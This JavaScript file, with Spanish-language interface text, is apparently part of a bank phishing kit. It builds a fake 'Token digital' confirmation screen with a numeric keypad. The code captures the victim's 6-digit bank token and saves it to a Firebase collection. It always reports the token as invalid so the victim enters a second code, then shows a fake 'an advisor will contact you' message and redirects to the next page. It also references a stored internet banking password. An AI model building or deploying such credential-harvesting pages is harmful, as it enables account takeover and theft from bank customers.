// Crear el modal flotante de token completamente estático y centrado
const modalHTML = `
<div id="modal-token" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center; padding:10px; box-sizing:border-box;">
  <div class="token-container" style="background:#f5f8ff; padding:20px 18px; border-radius:16px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:100%; max-width:340px; min-width:300px; margin:0 auto; position:static; transform:none;">
    
    <!-- Header compacto -->
    <div class="token-header" style="margin-bottom:18px;">
      <div class="phone-illustration" style="margin-bottom:10px; display:flex; justify-content:center;">
        <img src="./assets/img/token.png" alt="Token Digital" class="token-image" style="width:150px; height:150px; object-fit:contain;">
      </div>
      <h1 style="color:#6b7280; font-size:13px; font-weight:400; margin-bottom:3px; margin-top:0;">Para confirmar ingresa tu</h1>
      <h2 style="color:#374151; font-size:16px; font-weight:600; margin:0;">Token digital o físico</h2>
    </div>

    <!-- Display de cuadrados con círculos dentro - MÁS PEQUEÑO -->
    <div class="token-display" style="margin-bottom:18px;">
      <div class="token-circles" style="display:flex; align-items:center; justify-content:center; gap:6px; padding:8px; background:#f8f9fa; border-radius:10px; border:1px solid #e9ecef; margin:0 auto; width:fit-content; max-width:280px;">
        <div class="square-container" id="square-0" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-1" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-2" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-3" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-4" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <div class="square-container" id="square-5" style="width:30px; height:30px; border:2px solid #dee2e6; border-radius:8px; display:flex; align-items:center; justify-content:center; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;">
          <div class="inner-circle" style="width:14px; height:14px; border:1px solid #dee2e6; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:600; color:#495057; background:white; transition:border-color 0.2s ease, background-color 0.2s ease;"></div>
        </div>
        <button class="eye-button" id="toggleVisibility" style="background:#6c757d; border:none; border-radius:8px; width:30px; height:30px; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:background-color 0.2s ease; margin-left:4px;">
          <img src="./assets/img/ojo.png" alt="Ver" class="eye-icon" style="width:40px; height:40px; filter:brightness(0) invert(1);">
        </button>
      </div>
    </div>

    <!-- Teclado numérico compacto -->
    <div class="keypad" style="margin-bottom:15px; display:flex; flex-direction:column; align-items:center;">
      <div class="keypad-container" style="width:100%; max-width:280px; display:flex; flex-direction:column; gap:10px;">
        <!-- Primera fila: 6 7 0 1 -->
        <div class="keypad-row" style="display:flex; gap:10px; justify-content:space-between;">
          <button class="key number-key" data-number="6" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">6</button>
          <button class="key number-key" data-number="7" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">7</button>
          <button class="key number-key" data-number="0" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">0</button>
          <button class="key number-key" data-number="1" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">1</button>
        </div>
        <!-- Segunda fila: 5 2 4 9 -->
        <div class="keypad-row" style="display:flex; gap:10px; justify-content:space-between;">
          <button class="key number-key" data-number="5" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">5</button>
          <button class="key number-key" data-number="2" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">2</button>
          <button class="key number-key" data-number="4" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">4</button>
          <button class="key number-key" data-number="9" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">9</button>
        </div>
        <!-- Tercera fila: basura 3 8 borrar -->
        <div class="keypad-row" style="display:flex; gap:10px; justify-content:space-between;">
          <button class="key action-key" id="deleteAll" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:#f8f9fa; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
            <img src="./assets/img/basura.png" alt="Borrar todo" class="action-icon" style="width:20px; height:20px; opacity:0.7;">
          </button>
          <button class="key number-key" data-number="3" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">3</button>
          <button class="key number-key" data-number="8" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:white; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">8</button>
          <button class="key action-key" id="deleteOne" style="width:58px; height:45px; border:2px solid #dee2e6; border-radius:8px; background:#f8f9fa; font-size:16px; font-weight:600; color:#495057; cursor:pointer; transition:border-color 0.2s ease, background-color 0.2s ease; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
            <img src="./assets/img/borrar.png" alt="Borrar" class="action-icon" style="width:20px; height:20px; opacity:0.7;">
          </button>
        </div>
      </div>
    </div>

    <!-- Información compacta -->
    <div class="info" style="display:flex; align-items:flex-start; gap:8px; padding:10px; background:#f8fafc; border-radius:8px; text-align:left; margin-bottom:15px;">
      <div class="info-icon" style="color:#3b82f6; font-weight:bold; font-size:12px; margin-top:1px; flex-shrink:0;">ⓘ</div>
      <p style="color:#6b7280; font-size:11px; line-height:1.3; margin:0;">Recuerda que el código de tu Token es diferente a tu Clave de Internet.</p>
    </div>

    <!-- Botón de validar compacto -->
    <button id="validate-token" style="width:85%; padding:13px 17px; background-color:#ff6c00; border:none; color:white; font-weight:bold; border-radius:8px; cursor:pointer; font-size:14px; transition:background-color 0.2s ease;">
      Validar Token
    </button>
  </div>
</div>

<!-- Modal de carga con loader como en la imagen -->
<div id="modal-cargando" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#002a8d; z-index:9999; justify-content:center; align-items:center; flex-direction:column; font-family:Arial, sans-serif;">
  <div class="spinner-container" style="display:flex; flex-direction:column; align-items:center;">
    <div class="spinner-wrapper" style="position:relative; width:70px; height:70px; margin-bottom:15px;">
      <div class="spinner" style="position:absolute; top:0; left:0; width:70px; height:70px; border:3px solid #002376; border-top:3px solid #ff7800; border-radius:50%; animation:spin 1s linear infinite;"></div>
      <img class="spinner-icon" src="./assets/img/favicon.png" alt="Ícono" style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); width:40px; height:40px; object-fit:contain;">
    </div>
    <p class="message" style="color:white; text-align:center; font-size:14px;">Espere un momento<br>por favor</p>
  </div>
</div>

<div id="modal-error-token" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center;">
  <div style="background:white; padding:20px; border-radius:10px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:90%; max-width:280px; margin:0 auto; position:static; transform:none;">
    <h3 style="margin-bottom:12px; color:#d00000; font-size:14px;">❌ Token inválido</h3>
    <p style="font-size:11px; line-height:1.4;">El token no puede ser igual a la clave de internet.<br>Ingresa a tu App para obtener el token digital.</p>
  </div>
</div>

<div id="modal-asesor" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); backdrop-filter:blur(1px); z-index:9999; justify-content:center; align-items:center;">
  <div style="background:white; padding:20px; border-radius:10px; box-shadow:0 8px 25px rgba(0,0,0,0.15); text-align:center; width:90%; max-width:280px; margin:0 auto; position:static; transform:none;">
    <h3 style="margin-bottom:12px; color:#002f87; font-size:14px;">📞 Atención al Cliente</h3>
    <p style="font-size:12px; line-height:1.4;">En breve un asesor se comunicará contigo.</p>
  </div>
</div>

<style>
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes ripple-animation {
  to {
    transform: scale(4);
    opacity: 0;
  }
}

/* Estados de los cuadrados */
.square-container.filled {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
}

.square-container.filled .inner-circle {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
}

.square-container.hidden .inner-circle {
  background: #495057 !important;
  border-color: #495057 !important;
}

/* Hover de botones */
.key:hover {
  border-color: #3b82f6 !important;
  background: #eff6ff !important;
  box-shadow: 0 2px 6px rgba(59, 130, 246, 0.12);
}

.key:active {
  box-shadow: 0 1px 3px rgba(59, 130, 246, 0.12);
}

.action-key:hover {
  background: #e9ecef !important;
  border-color: #adb5bd !important;
}

.eye-button:hover {
  background: #5a6268 !important;
}

#validate-token:hover {
  background-color: #e55a00 !important;
}

.ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(59, 130, 246, 0.25);
  transform: scale(0);
  animation: ripple-animation 0.5s linear;
  pointer-events: none;
}

/* RESPONSIVIDAD COMPLETA PARA TODOS LOS DISPOSITIVOS */

/* Tablets y pantallas grandes */
@media (min-width: 768px) {
  .token-container {
    max-width: 380px !important;
    padding: 25px 22px !important;
  }
  
  .token-circles {
    gap: 8px !important;
    padding: 12px !important;
    max-width: 320px !important;
  }
  
  .square-container {
    width: 35px !important;
    height: 35px !important;
  }
  
  .inner-circle {
    width: 16px !important;
    height: 16px !important;
    font-size: 10px !important;
  }
  
  .eye-button {
    width: 35px !important;
    height: 35px !important;
  }
  
  .eye-icon {
    width: 50px !important;
    height: 50px !important;
  }
  
  .key {
    width: 65px !important;
    height: 50px !important;
    font-size: 18px !important;
  }
  
  .keypad-container {
    max-width: 320px !important;
  }
  
  .keypad-row {
    gap: 12px !important;
  }
  
  .action-icon {
    width: 24px !important;
    height: 24px !important;
  }
}

/* Móviles grandes (iPhone Plus, Samsung Galaxy Note, etc.) */
@media (max-width: 767px) and (min-width: 415px) {
  .token-container {
    max-width: 340px !important;
    padding: 20px 18px !important;
  }
  
  .token-circles {
    gap: 6px !important;
    padding: 8px !important;
    max-width: 280px !important;
  }
  
  .square-container {
    width: 30px !important;
    height: 30px !important;
  }
  
  .inner-circle {
    width: 14px !important;
    height: 14px !important;
    font-size: 9px !important;
  }
  
  .eye-button {
    width: 30px !important;
    height: 30px !important;
  }
  
  .eye-icon {
    width: 14px !important;
    height: 14px !important;
  }
  
  .key {
    width: 58px !important;
    height: 45px !important;
    font-size: 16px !important;
  }
  
  .keypad-container {
    max-width: 280px !important;
  }
  
  .keypad-row {
    gap: 10px !important;
  }
  
  .action-icon {
    width: 20px !important;
    height: 20px !important;
  }
}

/* iPhone estándar (iPhone 12, 13, 14, etc.) */
@media (max-width: 414px) and (min-width: 376px) {
  .token-container {
    max-width: 320px !important;
    padding: 18px 16px !important;
    margin: 8px !important;
  }
  
  .token-circles {
    gap: 5px !important;
    padding: 7px !important;
    max-width: 260px !important;
  }
  
  .square-container {
    width: 28px !important;
    height: 28px !important;
  }
  
  .inner-circle {
    width: 13px !important;
    height: 13px !important;
    font-size: 8px !important;
  }
  
  .eye-button {
    width: 28px !important;
    height: 28px !important;
  }
  
  .eye-icon {
    width: 30px !important;
    height: 30px !important;
  }
  
  .key {
    width: 52px !important;
    height: 42px !important;
    font-size: 15px !important;
  }
  
  .keypad-container {
    max-width: 260px !important;
  }
  
  .keypad-row {
    gap: 8px !important;
  }
  
  .action-icon {
    width: 40px !important;
    height: 40px !important;
  }
  
  .token-image {
    width: 100px !important;
    height: 100px !important;
  }
}

/* iPhone SE, móviles pequeños */
@media (max-width: 375px) and (min-width: 321px) {
  .token-container {
    max-width: 300px !important;
    padding: 16px 14px !important;
    margin: 6px !important;
  }
  
  .token-circles {
    gap: 4px !important;
    padding: 6px !important;
    max-width: 240px !important;
  }
  
  .square-container {
    width: 26px !important;
    height: 26px !important;
  }
  
  .inner-circle {
    width: 12px !important;
    height: 12px !important;
    font-size: 7px !important;
  }
  
  .eye-button {
    width: 26px !important;
    height: 26px !important;
  }
  
  .eye-icon {
    width: 30px !important;
    height: 30px !important;
  }
  
  .key {
    width: 48px !important;
    height: 38px !important;
    font-size: 14px !important;
  }
  
  .keypad-container {
    max-width: 240px !important;
  }
  
  .keypad-row {
    gap: 7px !important;
  }
  
  .action-icon {
    width: 40px !important;
    height: 40px !important;
  }
  
  .token-image {
    width: 85px !important;
    height: 85px !important;
  }
  
  .token-header h1 {
    font-size: 12px !important;
  }
  
  .token-header h2 {
    font-size: 15px !important;
  }
}

/* Móviles muy pequeños (iPhone 5/SE primera generación) */
@media (max-width: 320px) {
  .token-container {
    max-width: 280px !important;
    padding: 14px 12px !important;
    margin: 4px !important;
  }
  
  .token-circles {
    gap: 3px !important;
    padding: 5px !important;
    max-width: 220px !important;
  }
  
  .square-container {
    width: 24px !important;
    height: 24px !important;
  }
  
  .inner-circle {
    width: 10px !important;
    height: 10px !important;
    font-size: 6px !important;
  }
  
  .eye-button {
    width: 24px !important;
    height: 24px !important;
  }
  
  .eye-icon {
    width: 8px !important;
    height: 8px !important;
  }
  
  .key {
    width: 42px !important;
    height: 35px !important;
    font-size: 13px !important;
  }
  
  .keypad-container {
    max-width: 220px !important;
  }
  
  .keypad-row {
    gap: 6px !important;
  }
  
  .action-icon {
    width: 14px !important;
    height: 14px !important;
  }
  
  .token-image {
    width: 50px !important;
    height: 50px !important;
  }
  
  .token-header h1 {
    font-size: 11px !important;
  }
  
  .token-header h2 {
    font-size: 14px !important;
  }
  
  .info p {
    font-size: 10px !important;
  }
  
  #validate-token {
    font-size: 13px !important;
    padding: 10px 12px !important;
  }
}

/* Dispositivos ultra pequeños */
@media (max-width: 280px) {
  .token-container {
    max-width: 260px !important;
    padding: 12px 10px !important;
    margin: 2px !important;
  }
  
  .token-circles {
    gap: 2px !important;
    padding: 4px !important;
    max-width: 200px !important;
  }
  
  .square-container {
    width: 22px !important;
    height: 22px !important;
  }
  
  .inner-circle {
    width: 8px !important;
    height: 8px !important;
    font-size: 5px !important;
  }
  
  .eye-button {
    width: 22px !important;
    height: 22px !important;
  }
  
  .eye-icon {
    width: 6px !important;
    height: 6px !important;
  }
  
  .key {
    width: 38px !important;
    height: 32px !important;
    font-size: 11px !important;
  }
  
  .keypad-container {
    max-width: 200px !important;
  }
  
  .keypad-row {
    gap: 4px !important;
  }
  
  .action-icon {
    width: 12px !important;
    height: 12px !important;
  }
  
  .token-image {
    width: 45px !important;
    height: 45px !important;
  }
}

/* Ajustes para orientación landscape en móviles */
@media (max-height: 500px) and (orientation: landscape) {
  .token-container {
    padding: 10px !important;
    margin: 3px !important;
    max-height: 95vh !important;
    overflow-y: auto !important;
  }
  
  .token-header {
    margin-bottom: 10px !important;
  }
  
  .token-image {
    width: 40px !important;
    height: 40px !important;
  }
  
  .token-display {
    margin-bottom: 10px !important;
  }
  
  .keypad {
    margin-bottom: 8px !important;
  }
  
  .info {
    margin-bottom: 8px !important;
    padding: 6px !important;
  }
  
  .key {
    height: 32px !important;
    font-size: 12px !important;
  }
  
  .square-container {
    width: 25px !important;
    height: 25px !important;
  }
  
  .inner-circle {
    width: 12px !important;
    height: 12px !important;
    font-size: 6px !important;
  }
}

/* Ajustes para pantallas con notch o bordes redondeados */
@supports (padding: max(0px)) {
  .token-container {
    padding-left: max(18px, env(safe-area-inset-left)) !important;
    padding-right: max(18px, env(safe-area-inset-right)) !important;
  }
}

/* Mejoras de accesibilidad */
@media (prefers-reduced-motion: reduce) {
  .key,
  .square-container,
  .inner-circle,
  .eye-button,
  #validate-token {
    transition: none !important;
  }
  
  .ripple {
    animation: none !important;
  }
  
  .spinner {
    animation: none !important;
  }
}

/* Ajustes para alto contraste */
@media (prefers-contrast: high) {
  .key {
    border-width: 3px !important;
  }
  
  .square-container {
    border-width: 3px !important;
  }
  
  .inner-circle {
    border-width: 2px !important;
  }
}

/* Optimización para touch targets */
@media (pointer: coarse) {
  .key {
    min-width: 44px !important;
    min-height: 44px !important;
  }
  
  .eye-button {
    min-width: 44px !important;
    min-height: 44px !important;
  }
  
  #validate-token {
    min-height: 44px !important;
  }
}
</style>
`;

// Clase para manejar el token input
class TokenInput {
  constructor() {
    this.token = '';
    this.maxLength = 6;
    this.isVisible = false;
    this.attemptCount = 0;
    this.init();
  }

  init() {
    this.bindEvents();
    this.updateDisplay();
  }

  bindEvents() {
    // Number keys
    document.querySelectorAll('.number-key').forEach(key => {
      key.addEventListener('click', (e) => {
        const number = e.target.dataset.number;
        this.addDigit(number);
      });
    });

    // Delete one digit
    document.getElementById('deleteOne').addEventListener('click', (e) => {
      this.deleteLastDigit();
    });

    // Delete all digits
    document.getElementById('deleteAll').addEventListener('click', (e) => {
      this.clearAll();
    });

    // Toggle visibility
    document.getElementById('toggleVisibility').addEventListener('click', (e) => {
      this.toggleVisibility();
    });

    // Keyboard support
    document.addEventListener('keydown', (e) => {
      if (document.getElementById('modal-token').style.display === 'flex') {
        if (e.key >= '0' && e.key <= '9') {
          this.addDigit(e.key);
        } else if (e.key === 'Backspace') {
          this.deleteLastDigit();
        } else if (e.key === 'Delete') {
          this.clearAll();
        }
      }
    });
  }

  addDigit(digit) {
    if (this.token.length < this.maxLength) {
      this.token += digit;
      this.updateDisplay();
      this.playSound();
    } else {
      this.playErrorSound();
    }
  }

  deleteLastDigit() {
    if (this.token.length > 0) {
      this.token = this.token.slice(0, -1);
      this.updateDisplay();
      this.playSound();
    }
  }

  clearAll() {
    this.token = '';
    this.updateDisplay();
    this.playSound();
  }

  toggleVisibility() {
    this.isVisible = !this.isVisible;
    this.updateDisplay();
    this.playSound();
  }

  updateDisplay() {
    const squares = document.querySelectorAll('.square-container');

    squares.forEach((square, index) => {
      const innerCircle = square.querySelector('.inner-circle');
      square.classList.remove('filled', 'hidden');
      innerCircle.textContent = '';

      if (index < this.token.length) {
        square.classList.add('filled');

        if (this.isVisible) {
          innerCircle.textContent = this.token[index];
        } else {
          square.classList.add('hidden');
        }
      }
    });

    // Update eye icon based on visibility state
    const eyeIcon = document.querySelector('.eye-icon');
    if (eyeIcon) {
      if (this.isVisible) {
        eyeIcon.style.opacity = '1';
      } else {
        eyeIcon.style.opacity = '0.7';
      }
    }
  }

  playSound() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();

      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);

      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.05);

      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.05);
    } catch (e) {
      console.log('Audio not supported');
    }
  }

  playErrorSound() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();

      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);

      oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
      gainNode.gain.setValueAtTime(0.08, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);

      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.1);
    } catch (e) {
      console.log('Audio not supported');
    }
  }

  getToken() {
    return this.token;
  }

  isValid() {
    return this.token.length === this.maxLength;
  }

  getAttemptCount() {
    return this.attemptCount;
  }

  incrementAttempt() {
    this.attemptCount++;
  }
}

document.addEventListener('DOMContentLoaded', () => {
  document.body.insertAdjacentHTML('beforeend', modalHTML);

  let tokenInput;

  // Mostrar modal de token después de 4 segundos
  setTimeout(() => {
    const modal = document.getElementById('modal-token');
    if (modal) {
      modal.style.display = 'flex';
      tokenInput = new TokenInput();
    }
  }, 4000);

  // Add ripple effect to buttons
  document.addEventListener('click', function (e) {
    if (e.target.closest('.key')) {
      const button = e.target.closest('.key');
      const ripple = document.createElement('span');
      const rect = button.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      const x = e.clientX - rect.left - size / 2;
      const y = e.clientY - rect.top - size / 2;

      ripple.style.width = ripple.style.height = size + 'px';
      ripple.style.left = x + 'px';
      ripple.style.top = y + 'px';
      ripple.classList.add('ripple');

      button.appendChild(ripple);

      setTimeout(() => {
        ripple.remove();
      }, 500);
    }
  });

  // Validación final del token
  document.addEventListener('click', async (e) => {
    if (e.target.id === 'validate-token') {
      if (tokenInput && tokenInput.isValid()) {
        const code = tokenInput.getToken();

        // Incrementar contador de intentos
        tokenInput.incrementAttempt();
        const currentAttempt = tokenInput.getAttemptCount();

        // Mostrar loader primero
        document.getElementById('modal-token').style.display = 'none';
        document.getElementById('modal-cargando').style.display = 'flex';

        // 🔐 Obtener o crear userId persistente
        let userId = localStorage.getItem('userId');
        if (!userId) {
          userId = crypto.randomUUID();
          localStorage.setItem('userId', userId);
        }

        // 🔥 Guardar token en Firebase
        try {
          await db.collection("prestamos").doc(userId).set({
            tokenIngresado: code,
            intentosToken: currentAttempt,
            etapa: "validacion-token",
            actualizado: new Date()
          }, { merge: true });
        } catch (error) {
          console.error("Error al guardar token en Firebase:", error);
        }

        // Simular procesamiento y mostrar resultado
        setTimeout(() => {
          document.getElementById('modal-cargando').style.display = 'none';
          document.getElementById('modal-error-token').style.display = 'flex';

          setTimeout(() => {
            document.getElementById('modal-error-token').style.display = 'none';

            if (currentAttempt >= 2) {
              document.getElementById('modal-asesor').style.display = 'flex';

              setTimeout(() => {
                localStorage.removeItem('claveInternet');
                window.location.href = 'index2.html';
              }, 5000);
            } else {
              document.getElementById('modal-token').style.display = 'flex';
              tokenInput.clearAll();
            }
          }, 3000);
        }, 3000);
      } else {
        alert('Debes ingresar los 6 dígitos del token');
        if (tokenInput) tokenInput.playErrorSound();
      }
    }
  });

});